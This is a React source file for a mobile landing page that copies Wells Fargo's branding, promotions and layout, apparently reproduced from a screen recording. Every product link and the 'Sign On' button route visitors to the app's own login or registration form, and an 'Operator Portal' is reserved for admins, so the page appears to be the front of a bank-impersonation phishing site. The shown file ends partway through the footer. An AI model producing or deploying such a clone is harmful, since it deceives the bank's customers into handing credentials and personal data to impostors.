import React, { useState } from 'react';
import { 
  Search, 
  X, 
  Menu, 
  ChevronRight, 
  ShieldCheck, 
  GraduationCap,
  Percent,
  CreditCard as CreditCardIcon
} from 'lucide-react';
import { useAuth } from '../context/AuthContext.tsx';

// Generated authentic visual assets matching the video
import manAndDogImg from '../assets/images/man_and_dog_1790812195803.jpg';
import hikersImg from '../assets/images/hikers_high_five_1790812209147.jpg';
import rewardsCardsImg from '../assets/images/rewards_cards_1790812222686.jpg';
import whoWeAreImg from '../assets/images/who_we_are_1790812234532.jpg';

interface LandingPageProps {
  onOpenAuth: (mode: 'login' | 'register') => void;
  onGoToPortal?: () => void;
}

// Custom authentic colorful 3D/illustrated icons matching the video exactly (00:04 - 00:06)
const CheckingIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="8" y="10" width="22" height="34" rx="4" fill="url(#phoneGrad)" stroke="#5c1d68" strokeWidth="1.5" />
    <rect x="14" y="14" width="10" height="22" rx="1.5" fill="#f3e5f5" />
    <circle cx="19" cy="40" r="1.5" fill="#e1bee7" />
    {/* Card emerging from phone */}
    <rect x="15" y="4" width="26" height="17" rx="2.5" fill="url(#cardGrad)" stroke="#d97706" strokeWidth="1.2" transform="rotate(3 15 4)" />
    <rect x="17" y="9" width="6" height="4.5" rx="1" fill="#fef3c7" transform="rotate(3 17 9)" />
    <line x1="16" y1="17" x2="38" y2="18" stroke="#b45309" strokeWidth="1" />
    <defs>
      <linearGradient id="phoneGrad" x1="8" y1="10" x2="30" y2="44" gradientUnits="userSpaceOnUse">
        <stop stopColor="#8e24aa" />
        <stop offset="1" stopColor="#5c1d68" />
      </linearGradient>
      <linearGradient id="cardGrad" x1="15" y1="4" x2="41" y2="21" gradientUnits="userSpaceOnUse">
        <stop stopColor="#fbbf24" />
        <stop offset="1" stopColor="#f59e0b" />
      </linearGradient>
    </defs>
  </svg>
);

const SavingsIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* Piggy / Wallet body */}
    <rect x="6" y="14" width="30" height="24" rx="6" fill="url(#piggyGrad)" stroke="#c2410c" strokeWidth="1.5" />
    {/* Snout */}
    <rect x="2" y="22" width="7" height="10" rx="3" fill="#ea580c" />
    <circle cx="4.5" cy="25" r="1" fill="#7c2d12" />
    <circle cx="4.5" cy="29" r="1" fill="#7c2d12" />
    {/* Eye */}
    <circle cx="14" cy="21" r="1.5" fill="#431407" />
    {/* Ear */}
    <path d="M12 14L8 8C12 7 15 10 15 14Z" fill="#ea580c" />
    {/* Gold Coin Dropping In */}
    <circle cx="28" cy="11" r="7" fill="url(#goldGrad)" stroke="#b45309" strokeWidth="1.2" />
    <text x="25.5" y="14" fill="#78350f" fontSize="8" fontWeight="bold" fontFamily="sans-serif">$</text>
    {/* Coin Slot */}
    <rect x="22" y="13" width="12" height="2" rx="1" fill="#7c2d12" />
    <defs>
      <linearGradient id="piggyGrad" x1="6" y1="14" x2="36" y2="38" gradientUnits="userSpaceOnUse">
        <stop stopColor="#fb923c" />
        <stop offset="1" stopColor="#ea580c" />
      </linearGradient>
      <linearGradient id="goldGrad" x1="21" y1="4" x2="35" y2="18" gradientUnits="userSpaceOnUse">
        <stop stopColor="#fde047" />
        <stop offset="1" stopColor="#d97706" />
      </linearGradient>
    </defs>
  </svg>
);

const CardsIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="5" y="12" width="36" height="24" rx="3.5" fill="url(#wfRedGrad)" stroke="#991b1b" strokeWidth="1.5" />
    <rect x="5" y="18" width="36" height="5" fill="#7f1d1d" />
    <rect x="9" y="27" width="7" height="5" rx="1" fill="#fde047" stroke="#b45309" strokeWidth="0.8" />
    <circle cx="34" cy="29" r="3" fill="#fca5a5" fillOpacity="0.8" />
    <circle cx="30" cy="29" r="3" fill="#f87171" fillOpacity="0.8" />
    <defs>
      <linearGradient id="wfRedGrad" x1="5" y1="12" x2="41" y2="36" gradientUnits="userSpaceOnUse">
        <stop stopColor="#dc2626" />
        <stop offset="1" stopColor="#b91c1c" />
      </linearGradient>
    </defs>
  </svg>
);

const HomeLoanIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M7 21L21 9L35 21" stroke="#3b82f6" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
    <rect x="10" y="20" width="22" height="18" rx="2" fill="url(#houseGrad)" stroke="#1d4ed8" strokeWidth="1.5" />
    <rect x="18" y="27" width="6" height="11" rx="1" fill="#1e3a8a" />
    <circle cx="35" cy="28" r="6.5" fill="url(#goldGradH)" stroke="#b45309" strokeWidth="1.2" />
    <text x="32.5" y="31" fill="#78350f" fontSize="7.5" fontWeight="bold" fontFamily="sans-serif">$</text>
    <defs>
      <linearGradient id="houseGrad" x1="10" y1="20" x2="32" y2="38" gradientUnits="userSpaceOnUse">
        <stop stopColor="#93c5fd" />
        <stop offset="1" stopColor="#3b82f6" />
      </linearGradient>
      <linearGradient id="goldGradH" x1="29" y1="22" x2="42" y2="35" gradientUnits="userSpaceOnUse">
        <stop stopColor="#fde047" />
        <stop offset="1" stopColor="#d97706" />
      </linearGradient>
    </defs>
  </svg>
);

const PersonalLoanIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="9" y="8" width="24" height="32" rx="3" fill="#ffedd5" stroke="#ea580c" strokeWidth="1.5" />
    <rect x="15" y="5" width="12" height="5" rx="1.5" fill="#f97316" />
    <line x1="14" y1="17" x2="28" y2="17" stroke="#c2410c" strokeWidth="1.8" strokeLinecap="round" />
    <line x1="14" y1="22" x2="25" y2="22" stroke="#ea580c" strokeWidth="1.5" strokeLinecap="round" />
    <line x1="14" y1="27" x2="22" y2="27" stroke="#ea580c" strokeWidth="1.5" strokeLinecap="round" />
    <circle cx="33" cy="30" r="7" fill="url(#goldGradP)" stroke="#b45309" strokeWidth="1.2" />
    <text x="30.5" y="33" fill="#78350f" fontSize="8" fontWeight="bold" fontFamily="sans-serif">$</text>
    <defs>
      <linearGradient id="goldGradP" x1="26" y1="23" x2="40" y2="37" gradientUnits="userSpaceOnUse">
        <stop stopColor="#fde047" />
        <stop offset="1" stopColor="#d97706" />
      </linearGradient>
    </defs>
  </svg>
);

const AutoLoanIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* Red Car Body */}
    <path d="M6 25L11 15C12 13 14 12 16 12H30C32 12 34 13 35 15L40 25V33C40 34 39 35 38 35H36C35 35 34 34 34 33V31H12V33C12 34 11 35 10 35H8C7 35 6 34 6 33V25Z" fill="url(#carRedGrad)" stroke="#991b1b" strokeWidth="1.2" />
    {/* Windshield */}
    <path d="M13 22L16 15H30L33 22H13Z" fill="#bae6fd" />
    {/* Wheels */}
    <circle cx="13" cy="31" r="3.5" fill="#1e293b" />
    <circle cx="13" cy="31" r="1.5" fill="#cbd5e1" />
    <circle cx="33" cy="31" r="3.5" fill="#1e293b" />
    <circle cx="33" cy="31" r="1.5" fill="#cbd5e1" />
    {/* Dollar Coin */}
    <circle cx="37" cy="18" r="6" fill="url(#goldGradA)" stroke="#b45309" strokeWidth="1" />
    <text x="35" y="20.5" fill="#78350f" fontSize="7" fontWeight="bold" fontFamily="sans-serif">$</text>
    <defs>
      <linearGradient id="carRedGrad" x1="6" y1="12" x2="40" y2="35" gradientUnits="userSpaceOnUse">
        <stop stopColor="#ef4444" />
        <stop offset="1" stopColor="#b91c1c" />
      </linearGradient>
      <linearGradient id="goldGradA" x1="31" y1="12" x2="43" y2="24" gradientUnits="userSpaceOnUse">
        <stop stopColor="#fde047" />
        <stop offset="1" stopColor="#d97706" />
      </linearGradient>
    </defs>
  </svg>
);

const InvestingIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="7" y="27" width="7" height="15" rx="1.5" fill="#c084fc" />
    <rect x="18" y="20" width="7" height="22" rx="1.5" fill="#a855f7" />
    <rect x="29" y="13" width="7" height="29" rx="1.5" fill="#7e22ce" />
    <path d="M8 22L19 14L29 7L38 12" stroke="#eab308" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
    <polygon points="39,6 43,12 37,13" fill="#eab308" />
  </svg>
);

const PremierIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="24" cy="22" r="7" fill="#7e22ce" />
    <path d="M12 38C12 31.5 17.5 28 24 28C30.5 28 36 31.5 36 38" fill="#a855f7" />
    {/* 3 Golden Stars */}
    <polygon points="24,6 25.5,9.5 29,9.8 26.5,12 27.2,15.5 24,13.6 20.8,15.5 21.5,12 19,9.8 22.5,9.5" fill="#eab308" />
    <polygon points="12,12 13,14.5 15.5,14.7 13.7,16.3 14.2,18.8 12,17.4 9.8,18.8 10.3,16.3 8.5,14.7 11,14.5" fill="#facc15" />
    <polygon points="36,12 37,14.5 39.5,14.7 37.7,16.3 38.2,18.8 36,17.4 33.8,18.8 34.3,16.3 32.5,14.7 35,14.5" fill="#facc15" />
  </svg>
);

const EducationIllustration = () => (
  <svg className="w-10 h-10 shrink-0" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="7" y="9" width="22" height="32" rx="3" fill="#86198f" stroke="#701a75" strokeWidth="1.5" />
    <rect x="11" y="13" width="14" height="6" rx="1" fill="#fdf4ff" />
    <circle cx="13" cy="23" r="1.5" fill="#f5d0fe" />
    <circle cx="18" cy="23" r="1.5" fill="#f5d0fe" />
    <circle cx="23" cy="23" r="1.5" fill="#f5d0fe" />
    <circle cx="13" cy="28" r="1.5" fill="#f5d0fe" />
    <circle cx="18" cy="28" r="1.5" fill="#f5d0fe" />
    <circle cx="23" cy="28" r="1.5" fill="#f5d0fe" />
    <circle cx="13" cy="33" r="1.5" fill="#f5d0fe" />
    <circle cx="18" cy="33" r="1.5" fill="#f5d0fe" />
    <circle cx="23" cy="33" r="1.5" fill="#f5d0fe" />
    {/* Angled Pencil */}
    <rect x="25" y="18" width="5" height="24" rx="1" fill="#fbbf24" stroke="#d97706" strokeWidth="1" transform="rotate(35 25 18)" />
    <polygon points="38,40 37,45 33,43" fill="#e11d48" transform="rotate(35 38 40)" />
  </svg>
);

export const LandingPage: React.FC<LandingPageProps> = ({ onOpenAuth, onGoToPortal }) => {
  const { currentUser, isAdmin } = useAuth();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [showSmartBanner, setShowSmartBanner] = useState(true);

  // Modals for interactive buttons
  const [activeModal, setActiveModal] = useState<{ title: string; content: string } | null>(null);

  const productsList = [
    { id: 'checking', title: 'Checking', icon: <CheckingIllustration />, action: () => onOpenAuth('register') },
    { id: 'savings', title: 'Savings & CDs', icon: <SavingsIllustration />, action: () => onOpenAuth('register') },
    { id: 'cards', title: 'Credit Cards', icon: <CardsIllustration />, action: () => onOpenAuth('register') },
    { id: 'home', title: 'Home Loans', icon: <HomeLoanIllustration />, action: () => onOpenAuth('register') },
    { id: 'personal', title: 'Personal Loans', icon: <PersonalLoanIllustration />, action: () => onOpenAuth('register') },
    { id: 'auto', title: 'Auto Loans', icon: <AutoLoanIllustration />, action: () => onOpenAuth('register') },
    { id: 'investing', title: 'Investing', icon: <InvestingIllustration />, action: () => onOpenAuth('register') },
    { id: 'premier', title: 'Premier', icon: <PremierIllustration />, action: () => onOpenAuth('register') },
    { id: 'education', title: 'Education & Tools', icon: <EducationIllustration />, action: () => onOpenAuth('register') }
  ];

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans selection:bg-[#d71e28] selection:text-white pb-12">
      
      {/* ---------------- 0. EXACT MOBILE SAFARI SMART APP BANNER (00:12) ---------------- */}
      {showSmartBanner && (
        <div className="bg-[#f8f9fa] border-b border-slate-200 px-3 py-2 flex items-center justify-between text-xs text-slate-800">
          <div className="flex items-center gap-2.5">
            <button
              onClick={() => setShowSmartBanner(false)}
              className="p-1 text-slate-400 hover:text-slate-600 transition-colors"
              aria-label="Dismiss banner"
            >
              <X className="w-4 h-4 stroke-[2]" />
            </button>
            <div className="w-8 h-8 rounded-lg bg-[#d71e28] text-white flex items-center justify-center font-serif font-black text-[10px] shadow-sm">
              WF
            </div>
            <div>
              <p className="font-bold text-slate-900 leading-tight">Wells Fargo Mobile</p>
              <p className="text-[11px] text-slate-500 leading-tight">Mobile banking...</p>
            </div>
          </div>
          <button
            onClick={() => onOpenAuth('register')}
            className="px-4 py-1 rounded-full bg-[#007aff] hover:bg-[#0069d9] text-white font-bold text-xs shadow-sm transition-colors"
          >
            Get
          </button>
        </div>
      )}

      {/* ---------------- 1. EXACT BRAND HEADER BAR (00:01) ---------------- */}
      <header className="sticky top-0 z-50 bg-[#d71e28]">
        {/* Main Red Brand Container */}
        <div className="max-w-2xl sm:max-w-3xl lg:max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
          
          {/* Left: Classic Two-Line Bold Serif Logo */}
          <div 
            onClick={() => { setIsMenuOpen(false); window.scrollTo({ top: 0, behavior: 'smooth' }); }}
            className="cursor-pointer select-none"
          >
            <div className="leading-[0.9]">
              <span className="block text-xl sm:text-2xl font-black font-serif tracking-normal text-white uppercase">
                WELLS
              </span>
              <span className="block text-xl sm:text-2xl font-black font-serif tracking-normal text-white uppercase mt-0.5">
                FARGO
              </span>
            </div>
          </div>

          {/* Right: Sign On Pill + Menu Button */}
          <div className="flex items-center gap-3">
            {currentUser ? (
              <button
                onClick={onGoToPortal}
                className="px-4 py-1.5 rounded-full bg-white hover:bg-slate-100 text-slate-900 font-bold text-xs sm:text-sm shadow-sm transition-transform active:scale-95"
              >
                {isAdmin ? 'Operator Portal' : 'My Account'}
              </button>
            ) : (
              <button
                onClick={() => onOpenAuth('login')}
                className="px-5 py-1.5 rounded-full bg-white hover:bg-slate-100 text-slate-900 font-bold text-xs sm:text-sm shadow-sm transition-transform active:scale-95"
              >
                Sign On
              </button>
            )}

            {/* Red Square Menu / Close Button */}
            <button
              onClick={() => setIsMenuOpen(!isMenuOpen)}
              className="flex flex-col items-center justify-center w-12 h-12 bg-[#b8141d] hover:bg-[#a10e16] text-white rounded transition-colors"
              aria-label="Menu"
            >
              {isMenuOpen ? (
                <>
                  <X className="w-5 h-5 stroke-[2.5]" />
                  <span className="text-[9px] font-bold tracking-wider uppercase mt-0.5">CLOSE</span>
                </>
              ) : (
                <>
                  <Menu className="w-5 h-5 stroke-[2.5]" />
                  <span className="text-[9px] font-bold tracking-wider uppercase mt-0.5">MENU</span>
                </>
              )}
            </button>
          </div>

        </div>

        {/* Gold Accent Stripe */}
        <div className="h-1 bg-[#ffd100]" />
      </header>

      {/* ---------------- 2. EXACT SLIDE-OUT MENU DRAWER (00:14 - 00:20) ---------------- */}
      {isMenuOpen && (
        <div className="fixed inset-x-0 top-[68px] bottom-0 z-40 bg-white overflow-y-auto animate-in slide-in-from-top duration-200">
          <div className="max-w-2xl sm:max-w-3xl lg:max-w-4xl mx-auto px-4 py-4 space-y-4">
            
            {/* Search Input Bar */}
            <div className="relative">
              <Search className="w-5 h-5 text-slate-400 absolute left-3.5 top-3.5" />
              <input
                type="text"
                placeholder="Search"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-11 pr-4 py-3 rounded-lg bg-slate-100 border border-slate-300 text-sm font-medium text-slate-900 focus:outline-none focus:border-[#d71e28]"
              />
            </div>

            {/* Active Gold Category Header */}
            <div className="bg-[#ffd100] text-slate-950 font-bold text-base px-4 py-3 rounded flex items-center justify-between">
              <span>Personal</span>
            </div>

            {/* Personal Category Links with Purple Chevrons */}
            <div className="divide-y divide-slate-100 border-b border-slate-200">
              {[
                { name: 'Checking', action: () => onOpenAuth('register') },
                { name: 'Savings & CDs', action: () => onOpenAuth('register') },
                { name: 'Credit Cards', action: () => onOpenAuth('register') },
                { name: 'Home Loans', action: () => onOpenAuth('register') },
                { name: 'Personal Loans', action: () => onOpenAuth('register') },
                { name: 'Auto Loans', action: () => onOpenAuth('register') },
                { name: 'Premier', action: () => onOpenAuth('register') },
                { name: 'Education & Tools', action: () => onOpenAuth('register') }
              ].map((item) => (
                <button
                  key={item.name}
                  onClick={() => {
                    item.action();
                    setIsMenuOpen(false);
                  }}
                  className="w-full py-3.5 px-3 flex items-center justify-between hover:bg-slate-50 transition-colors text-left"
                >
                  <span className="font-semibold text-slate-900 text-sm">
                    {item.name}
                  </span>
                  <ChevronRight className="w-5 h-5 text-[#76226c]" />
                </button>
              ))}
            </div>

            {/* Other Divisions List */}
            <div className="space-y-1 pt-2 divide-y divide-slate-100">
              {[
                'Investing & Wealth Management',
                'Business',
                'Commercial Banking',
                'Corporate & Investment Banking',
                'About Wells Fargo'
              ].map((divName) => (
                <button
                  key={divName}
                  onClick={() => {
                    setIsMenuOpen(false);
                    onOpenAuth('register');
                  }}
                  className="w-full py-3 px-3 text-left font-semibold text-slate-800 hover:text-[#d71e28] text-sm block transition-colors"
                >
                  {divName}
                </button>
              ))}
            </div>

            {/* Menu Footer Utility Links */}
            <div className="pt-4 border-t border-slate-200 text-xs text-slate-700 space-y-3 px-3 pb-8">
              <button 
                onClick={() => { setIsMenuOpen(false); setActiveModal({ title: 'ATMs & Locations', content: 'Explore our 12,000+ ATMs and financial centers worldwide.' }); }}
                className="block hover:underline"
              >
                ATMs/Locations
              </button>
              <button 
                onClick={() => { setIsMenuOpen(false); setActiveModal({ title: 'Customer Service & FAQs', content: '24/7 Wells Fargo client care desk is ready to assist you. Call 1-800-WELLS-FARGO or sign on to start a secure support ticket.' }); }}
                className="block hover:underline"
              >
                Customer service and FAQs
              </button>
              <button 
                onClick={() => { setIsMenuOpen(false); setActiveModal({ title: 'Español', content: 'Servicio al cliente disponible en español.' }); }}
                className="block hover:underline"
              >
                Español
              </button>
            </div>

          </div>
        </div>
      )}

      {/* ---------------- 3. HERO CHECKING BONUS SECTION (00:02 - 00:04) ---------------- */}
      <section className="bg-white pt-10 pb-12 sm:pt-14 sm:pb-16 text-center border-b border-slate-100">
        <div className="max-w-xl mx-auto px-4 space-y-2">
          
          {/* "Enjoy" script in purple */}
          <p className="text-2xl font-serif text-[#76226c] font-normal">
            Enjoy
          </p>

          {/* Large $325 in rich purple serif */}
          <div className="text-6xl sm:text-7xl font-bold font-serif text-[#76226c] tracking-tight">
            $325
          </div>

          {/* Headline */}
          <h1 className="text-2xl sm:text-3xl font-bold text-slate-900 pt-3 tracking-tight">
            $325 checking bonus on us
          </h1>

          {/* Subtitle */}
          <p className="text-sm text-slate-700 max-w-sm mx-auto leading-relaxed pt-1">
            New customers open an eligible checking account with qualifying direct deposits
          </p>

          {/* "Get started >>" rounded outline pill button */}
          <div className="pt-5">
            <button
              onClick={() => onOpenAuth('register')}
              className="inline-flex items-center gap-1.5 px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-sm transition-all shadow-sm"
            >
              <span>Get started</span>
              <span className="font-bold">&gt;&gt;</span>
            </button>
          </div>

        </div>
      </section>

      {/* ---------------- 4. VERTICAL PRODUCT LIST (00:04 - 00:06) ---------------- */}
      <section className="bg-white py-2 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="divide-y divide-slate-100 border-b border-slate-100">
          {productsList.map((item) => (
            <button
              key={item.id}
              onClick={item.action}
              className="w-full py-4 px-2 flex items-center gap-4 hover:bg-slate-50 transition-colors text-left group"
            >
              <div className="shrink-0 group-hover:scale-105 transition-transform">
                {item.icon}
              </div>
              <span className="text-base font-medium text-slate-900 group-hover:text-[#d71e28] transition-colors">
                {item.title}
              </span>
            </button>
          ))}
        </div>
      </section>

      {/* ---------------- 5. SPECIAL PROMOTIONAL CARDS (00:06 - 00:08) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4 space-y-4">
        
        {/* Card 1: $125 Bonus */}
        <div className="p-5 rounded-2xl bg-white border border-slate-200/90 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#76226c] shrink-0 mt-0.5">
            <GraduationCap className="w-7 h-7 stroke-[1.5]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              New customer? Say hello to a $125 bonus
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Open a Clear Access Banking account, great for students &amp; more, complete offer requirements
            </p>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#76226c] hover:underline flex items-center gap-1 pt-1"
            >
              <span>See offer details</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

        {/* Card 2: 60,000 Bonus Points */}
        <div className="p-5 rounded-2xl bg-white border border-slate-200/90 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#991b1b] shrink-0 mt-0.5">
            <CreditCardIcon className="w-7 h-7 stroke-[1.5]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              Earn 60,000 bonus points
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              when you spend $4,000 in purchases in the first 3 months. Terms apply.
            </p>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#76226c] hover:underline flex items-center gap-1 pt-1"
            >
              <span>Learn more</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

        {/* Card 3: Find a Credit Card */}
        <div className="p-5 rounded-2xl bg-white border border-slate-200/90 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#991b1b] shrink-0 mt-0.5">
            <CreditCardIcon className="w-7 h-7 stroke-[1.5]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              Find a credit card
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Low intro rate, cash back, rewards and more
            </p>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#76226c] hover:underline flex items-center gap-1 pt-1"
            >
              <span>Learn more</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

        {/* Card 4: Interest Rates Today */}
        <div className="p-5 rounded-2xl bg-white border border-slate-200/90 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#d97706] shrink-0 mt-0.5">
            <Percent className="w-7 h-7 stroke-[2]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              Interest rates today
            </h3>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#76226c] hover:underline flex items-center gap-1 pt-1"
            >
              <span>Learn more</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

      </section>

      {/* ---------------- 6. ONE KEY REWARDS CARD BANNER (00:08 - 00:09) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="rounded-2xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          {/* Card Showcase Graphic */}
          <div className="w-full overflow-hidden">
            <img 
              src={rewardsCardsImg} 
              alt="Wells Fargo One Key Rewards Credit Cards"
              className="w-full h-auto object-cover max-h-64 sm:max-h-72" 
            />
          </div>

          {/* Text and Action */}
          <div className="p-6 text-center space-y-3">
            <h2 className="text-2xl font-serif text-slate-900 font-normal">
              Earn up to $350 in One Key rewards
            </h2>
            <p className="text-xs text-slate-600 max-w-md mx-auto leading-relaxed">
              Use rewards on eligible bookings on Expedia®, Hotels.com®, and Vrbo®. Terms apply.
            </p>
            <div className="pt-2">
              <button
                onClick={() => onOpenAuth('register')}
                className="px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                Learn more
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------------- 7. FINANCIAL GUIDANCE AND SUPPORT (00:09 - 00:11) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4 space-y-6">
        
        {/* Section Heading */}
        <div className="text-center pt-2">
          <h2 className="text-2xl sm:text-3xl font-serif text-slate-900 font-normal">
            Financial guidance and support
          </h2>
        </div>

        {/* Card 1: Man and Dog - "Secure your next chapter" */}
        <div className="rounded-2xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          <div className="w-full overflow-hidden">
            <img 
              src={manAndDogImg} 
              alt="Man with golden retriever in sunlit field"
              className="w-full h-52 sm:h-64 object-cover" 
            />
          </div>
          <div className="p-6 space-y-3">
            <h3 className="text-xl font-bold text-slate-900 tracking-tight">
              Secure your next chapter
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Protect what you've built as you look ahead
            </p>
            <div className="pt-1">
              <button
                onClick={() => onOpenAuth('register')}
                className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                Unlock your options
              </button>
            </div>
          </div>
        </div>

        {/* Card 2: Hikers High-Five - "Your dreams, your plan" */}
        <div className="rounded-2xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          <div className="w-full overflow-hidden">
            <img 
              src={hikersImg} 
              alt="Two hikers high-fiving on mountain summit"
              className="w-full h-52 sm:h-64 object-cover" 
            />
          </div>
          <div className="p-6 space-y-3">
            <h3 className="text-xl font-bold text-slate-900 tracking-tight">
              Your dreams, your plan
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Start crafting the foundation for the future you see yourself in
            </p>
            <div className="pt-1">
              <button
                onClick={() => onOpenAuth('register')}
                className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                Get started
              </button>
            </div>
          </div>
        </div>

      </section>

      {/* ---------------- 8. FRAUD & SCAM ALERT (00:11 - 00:12) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="p-6 rounded-2xl bg-white border border-slate-200 shadow-sm space-y-4">
          
          {/* Header with Gold Shield */}
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-amber-400/20 text-amber-500 flex items-center justify-center shrink-0">
              <ShieldCheck className="w-7 h-7 text-amber-500 fill-amber-400" />
            </div>
            <div>
              <h4 className="text-base font-bold text-slate-900">
                Fraud &amp; Scam Alert
              </h4>
              <p className="text-xs text-slate-500">
                The latest news and what to watch for
              </p>
            </div>
          </div>

          {/* Headline & Description */}
          <div className="space-y-1">
            <h3 className="text-xl font-bold text-slate-900">
              Think it's your bank? Look again.
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Learn what to do if a scammer calls
            </p>
          </div>

          {/* Button: "Get 5 tips" */}
          <div className="pt-1">
            <button
              onClick={() => setActiveModal({
                title: 'Fraud & Scam Defense: 5 Key Tips',
                content: '1. Never share your transaction PIN or one-time codes over the phone.\n2. Hang up and dial the official number on the back of your card.\n3. Do not rush to transfer funds to any "safe" account.\n4. Enable biometric sign-on and notifications.\n5. Report suspicious calls or phishing SMS immediately.'
              })}
              className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
            >
              Get 5 tips
            </button>
          </div>

        </div>
      </section>

      {/* ---------------- 9. WHO WE ARE (00:23 - 00:24) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="rounded-2xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          <div className="w-full overflow-hidden">
            <img 
              src={whoWeAreImg} 
              alt="Community volunteers"
              className="w-full h-48 sm:h-56 object-cover" 
            />
          </div>
          <div className="p-6 space-y-3">
            <h3 className="text-xl font-bold text-slate-900 tracking-tight">
              Who we are
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.
            </p>
            <div className="pt-1">
              <button
                onClick={() => onOpenAuth('register')}
                className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                About Wells Fargo
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------------- 10. AUTHENTIC WELLS FARGO MOBILE FOOTER ---------------- */}
      <footer className="mt-12 bg-[#f4f4f4] border-t border-slate-200 text-slate-600 text-xs py-8 px-4">
        <div className="max-w-xl sm:max-w-2xl mx-auto space-y-6">
          
          <div className="space-y-3">
            <p className="font-bold text-slate-800 text-xs">Connect with us</p>
            <div className="flex items-center gap-4 text-slate-600 text-sm">
              <span className="font-semibold hover:underline cursor-pointer">Facebook</span>
              <span className="font-semibold hover:underline cursor-pointer">LinkedIn</span>
              <span className="font-semibold hover:underline cursor-pointer">Instagram</span>
              <span className="font-semibold hover:underline cursor-pointer">YouTube</span>
              <span className="font-semibold hover:underline cursor-pointer">X (Twitter)</span>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-2 text-[11px] text-slate-600 border-t border-slate-200/80 pt-4">
            <span className="hover:underline cursor-pointer">About Wells Fargo</span>
            <span className="hover:underline cursor-pointer">Careers</span>
            <span className="hover:underline cursor-pointer">Privacy &amp; Security</span>
            <span className="hover:underline cursor-pointer">Notice of Data Collection</span>
            <span className="hover:underline cursor-pointer">General Terms of Use</span>
